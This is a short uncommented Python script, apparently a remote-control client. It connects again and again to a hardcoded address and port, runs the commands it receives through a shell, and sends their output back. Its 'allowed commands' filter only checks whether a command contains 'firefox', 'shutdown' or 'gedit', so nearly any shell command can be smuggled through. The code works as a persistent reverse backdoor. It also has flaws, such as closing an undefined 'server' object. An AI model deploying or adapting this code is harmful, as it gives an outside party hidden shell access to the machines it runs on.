#!/usr/bin/env python
import socket
import select
import sys
import subprocess
import time

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
IP_address = '172.16.54.254'
Port = 2004
acc = ['firefox', 'shutdown', 'gedit']

while True:
    try:
        conn.connect((IP_address, Port))
        while True:
            sockets_list = [sys.stdin, conn]

            read_sockets, write_socket, error_socket = select.select(sockets_list, [], [])

            for socks in read_sockets:
                if socks == conn:
                    command = socks.recv(2048)
                    for x in acc:
                        if x in command:
                            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                   stdin=subprocess.PIPE)
                            conn.send(CMD.stdout.read())
                            conn.send(CMD.stderr.read())
                        else:
                            continue
                else:
                    continue
    except:
        time.sleep(10)
        continue

server.close()




